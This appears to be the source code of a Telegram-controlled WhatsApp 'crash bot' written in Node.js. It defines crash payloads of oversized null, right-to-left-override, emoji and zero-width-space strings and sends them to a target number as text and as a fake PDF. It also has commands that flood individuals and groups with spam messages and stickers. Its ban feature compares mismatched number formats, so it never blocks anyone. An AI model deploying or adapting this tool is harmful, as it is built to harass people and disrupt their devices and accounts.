require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { WA } = require('./lib/wa');
const fs = require('fs');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
if (!TOKEN) { console.log('❌ .env mein TELEGRAM_BOT_TOKEN daalo!'); process.exit(1); }

const bot = new TelegramBot(TOKEN, { polling: true });
const wa = new WA();

const CRASH_PAYLOADS = [
    Buffer.alloc(65000, 0).toString('utf-8'), 
    '\u202E'.repeat(30000),                   
    '🪇🪇🪇🪇🪇🪇🪇🪇🪇🪇'.repeat(5000),          
    'X'.repeat(65535),                        
    '\u200B'.repeat(50000)                    
];
const SPAM_TEXT = "🔥 GENIUS BOT WAS HERE 🔥";

// Add this at the top of your file to maintain the ban list
const bannedNumbers = new Set();

if (wa.hasSession()) {
    console.log('♻️ Saved WhatsApp session mila - connect ho raha hai...');
    wa.start().catch(e => console.log('WA start error:', e.message));
}

setInterval(() => {
    if (wa.state === 'offline' && !wa.stopped && wa.hasSession()) {
        console.log('🐕 Watchdog: WhatsApp offline tha, reconnect kar raha hu...');
        wa.start().catch(e => console.log('WA restart error:', e.message));
    }
}, 120000);

bot.on('polling_error', e => console.log('[telegram]', e.message));

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || !text.startsWith('/')) return;

    const args = text.split(' ');
    const command = args[0].toLowerCase();

    if (command === '/start') {
        return bot.sendMessage(chatId, `💀 **GENIUS CRASH BOT** 💀\n\n/link <number> - Connect WhatsApp\n/crash <number> - Crash target\n/spam <number> - Spam target\n/fastspam <number> - Fast Spam\n/sticker <number> - Sticker Spam\n/groupspam <id> - Group Spam\n/ban <number> - Ban a number`, { parse_mode: 'Markdown' });
    }

    if (command === '/link') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /link 919876543210');
        const phone = args[1].replace(/\D/g, '');
        bot.sendMessage(chatId, `⏳ Generating pairing code for +${phone}...`);
        
        try {
            const sock = await wa.start();
            if (!sock.authState.creds.registered) {
                setTimeout(async () => {
                    const code = await sock.requestPairingCode(phone);
                    bot.sendMessage(chatId, `🔑 **WhatsApp Code:** \`${code}\`\n\nWhatsApp -> Linked Devices -> Link with Phone Number`, { parse_mode: 'Markdown' });
                }, 3000);
            }
        } catch (e) {
            bot.sendMessage(chatId, `❌ Error: ${e.message}`);
        }
        return;
    }

    if (!wa.sock || wa.state !== 'online') {
        return bot.sendMessage(chatId, '❌ WhatsApp is not connected. Use `/link <number>` first.');
    }

    // Modify the /ban command to add a number to the ban list
    if (command === '/ban') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /ban 919876543210');
        const number = args[1].replace(/\D/g, '');
        bannedNumbers.add(number);
        bot.sendMessage(chatId, `🚫 Number +${number} has been banned.`);
        return;
    }

    // Modify the message sending functions to check the ban list
    async function sendMessageToNumber(number, message) {
        const target = number.replace(/\D/g, '') + '@s.whatsapp.net';
        if (bannedNumbers.has(target)) {
            console.log(`🚫 Message to +${number} was not sent because the number is banned.`);
            return;
        }
        try {
            await wa.sock.sendMessage(target, message);
        } catch (e) {
            console.error(`❌ Error sending message to +${number}:`, e.message);
        }
    }

    // Update the /crash, /spam, /fastspam, and /sticker commands to use the new sendMessageToNumber function
    if (command === '/crash') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /crash 919876543210');
        const target = args[1].replace(/\D/g, '');
        bot.sendMessage(chatId, `💀 Sending crash to +${target}...`);
        for (let p of CRASH_PAYLOADS) {
            await sendMessageToNumber(target, { text: p });
            await sendMessageToNumber(target, { document: Buffer.from(p), mimetype: 'application/pdf', fileName: 'crash.pdf' });
            await new Promise(r => setTimeout(r, 500));
        }
        bot.sendMessage(chatId, '✅ Crash done.');
    }

    if (command === '/spam') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /spam 919876543210');
        const target = args[1].replace(/\D/g, '');
        bot.sendMessage(chatId, `🚀 Spamming +${target}...`);
        for (let i = 0; i < 30; i++) {
            await sendMessageToNumber(target, { text: `${SPAM_TEXT} [${i+1}]` });
            await new Promise(r => setTimeout(r, 1000));
        }
        bot.sendMessage(chatId, '✅ Spam done.');
    }

    if (command === '/fastspam') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /fastspam 919876543210');
        const target = args[1].replace(/\D/g, '');
        bot.sendMessage(chatId, `⚡ FAST Spamming +${target}...`);
        const promises = [];
        for (let i = 0; i < 20; i++) {
            promises.push(sendMessageToNumber(target, { text: `FAST SPAM [${i+1}]` }));
        }
        await Promise.all(promises);
        bot.sendMessage(chatId, '✅ Fast spam done.');
    }

    if (command === '/groupspam') {
        const groupId = args[1];
        if (!groupId || !groupId.includes('@g.us')) return bot.sendMessage(chatId, '❌ Format: /groupspam 123456789-123456@g.us');
        bot.sendMessage(chatId, `🚀 Spamming Group...`);
        for (let i = 0; i < 50; i++) {
            await wa.sock.sendMessage(groupId, { text: `${SPAM_TEXT} [${i+1}]` });
            await new Promise(r => setTimeout(r, 800));
        }
        bot.sendMessage(chatId, '✅ Group spam done.');
    }

    if (command === '/sticker') {
        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /sticker 919876543210');
        const target = args[1].replace(/\D/g, '');
        try {
            const buffer = fs.readFileSync('./assets/sticker.webp');
            bot.sendMessage(chatId, `🧸 Sticker Spam on +${target}...`);
            for (let i = 0; i < 30; i++) {
                await sendMessageToNumber(target, { sticker: buffer });
                await new Promise(r => setTimeout(r, 300));
            }
            bot.sendMessage(chatId, '✅ Sticker spam done.');
        } catch (e) {
            bot.sendMessage(chatId, '❌ Error: assets/sticker.webp not found.');
        }
    }
});
